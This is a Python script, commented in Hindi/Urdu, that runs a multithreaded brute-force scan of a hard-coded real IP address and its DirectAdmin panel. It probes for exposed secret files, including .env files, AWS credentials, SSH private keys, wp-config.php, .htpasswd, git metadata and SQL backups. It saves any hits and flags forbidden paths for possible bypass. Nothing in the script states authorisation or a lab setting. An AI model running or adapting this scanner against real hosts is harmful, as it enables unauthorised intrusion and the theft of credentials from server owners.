import requests
from concurrent.futures import ThreadPoolExecutor
import urllib3

# SSL warnings disable kar raha hoon kyunki self-signed certs hain
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = "http://37.97.145.109"
target_ssl = "https://37.97.145.109"
da_panel = "http://37.97.145.109:2222"

# 100+ High-Impact Paths
paths = [
    # --- Environmental & Credentials ---
    "/.env", "/.env.bak", "/.env.old", "/.env.php", "/.env.local", "/.env.dev", "/.env.save",
    "/.aws/credentials", "/.docker/config.json", "/.ssh/id_rsa", "/.ssh/known_hosts",
    "/config.php", "/config.php.bak", "/config.php.old", "/wp-config.php", "/wp-config.bak",
    "/web.config", "/web.config.txt", "/settings.py", "/.htpasswd", "/.htaccess",
    
    # --- Backups & Databases ---
    "/backup.sql", "/db.sql", "/dump.sql", "/mysql.sql", "/backup.tar.gz", "/site.zip",
    "/data.zip", "/www.zip", "/archive.tar.gz", "/old.zip", "/backup.zip", "/test.sql",
    "/temp.sql", "/database.sql", "/db_backup.sql", "/full_backup.zip",
    
    # --- Version Control (Git/SVN) ---
    "/.git/config", "/.git/HEAD", "/.git/index", "/.git/logs/HEAD", "/.gitignore",
    "/.svn/entries", "/.svn/all-wcprops", "/.hg/hgrc", "/.bzr/checkout/dirstate",
    
    # --- DirectAdmin & Hosting Specifics ---
    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/myadmin/", "/roundcube/", "/webmail/",
    "/squirrelmail/", "/cgi-bin/", "/cgi-bin/test.cgi", "/.well-known/security.txt",
    "/robots.txt", "/sitemap.xml", "/ads.txt", "/LICENSE.txt", "/README.md",
    
    # --- Development & Debugging ---
    "/info.php", "/phpinfo.php", "/test.php", "/status", "/server-status",
    "/.vscode/settings.json", "/.idea/workspace.xml", "/npm-debug.log", "/yarn.lock",
    "/package.json", "/composer.json", "/composer.lock", "/Dockerfile", "/docker-compose.yml",
    
    # --- DirectAdmin Panels ---
    "/evo/", "/evo/static/js/manifest.json", "/CMD_ALLOWED_COMMANDS", "/CMD_LOGS_VIEW"
]

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
}

def scan_path(path):
    # Donon HTTP aur HTTPS check karega
    for base in [target, target_ssl, da_panel]:
        url = f"{base}{path}"
        try:
            # allow_redirects=False taake humein asali 302 ya 200 ka pata chale
            r = requests.get(url, headers=headers, timeout=4, verify=False, allow_redirects=False)
            
            if r.status_code == 200:
                print(f"[+] FOUND (200 OK): {url} | Size: {len(r.content)}")
                # Agar 200 mil jaye toh output file mein save kar lo
                with open("found_paths.txt", "a") as f:
                    f.write(f"{url} | Size: {len(r.content)}\n")
            
            elif r.status_code == 403:
                print(f"[*] FORBIDDEN (403): {url} (Check for Bypass!)")
            
            elif r.status_code == 302 or r.status_code == 301:
                # Redirect check (Aksar panel par bhej deta hai)
                loc = r.headers.get('Location', 'Unknown')
                print(f"[!] REDIRECT ({r.status_code}): {url} -> {loc}")

        except requests.exceptions.RequestException:
            pass

def main():
    print(f"--- CyberOps Bruteforce Started on {target} ---")
    print(f"[*] Total Paths to Scan: {len(paths) * 3}") # 3 base URLs hain
    
    # 20 threads taake speed fast ho magar server crash na ho
    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(scan_path, paths)
    
    print("\n--- Scan Complete. Results saved in found_paths.txt ---")

if __name__ == "__main__":
    main()
